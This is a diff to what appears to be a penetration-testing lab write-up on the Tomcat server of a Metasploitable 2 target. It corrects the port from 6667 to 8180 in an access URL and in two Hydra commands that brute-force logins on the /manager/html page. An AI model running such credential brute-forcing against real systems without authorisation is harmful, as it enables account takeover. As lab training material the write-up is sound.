@@ -4,12 +4,12 @@ This section covers the Tomcat web server running on the Metasploitable 2 target
 
 ## Accessing the Tomcat Web Server
 
-The Tomcat web server is accessible on port `6667` of the target machine.
+The Tomcat web server is accessible on port `8180` of the target machine.
 
 The web interface can be accessed through a browser using the target's IP address and port.
 
 ```bash
-http://192.168.122.68:6667
+http://192.168.122.68:8180
 ```
 
 The Tomcat web page confirms that the service is running.
@@ -52,7 +52,7 @@ sudo apt update && sudo apt install seclists hydra
 I then used Hydra with a known username and password:
 
 ```bash
-hydra -l username -p password -s 6667 -f 192.168.122.68 http-get /manager/html
+hydra -l username -p password -s 8180 -f 192.168.122.68 http-get /manager/html
 ```
 
 Here:
@@ -67,7 +67,7 @@ Here:
 You can also use username and password lists instead:
 
 ```bash
-hydra -L username-list -P password-list -s 6667 -f 192.168.122.68 http-get /manager/html
+hydra -L username-list -P password-list -s 8180 -f 192.168.122.68 http-get /manager/html
 ```
 
 In this case:
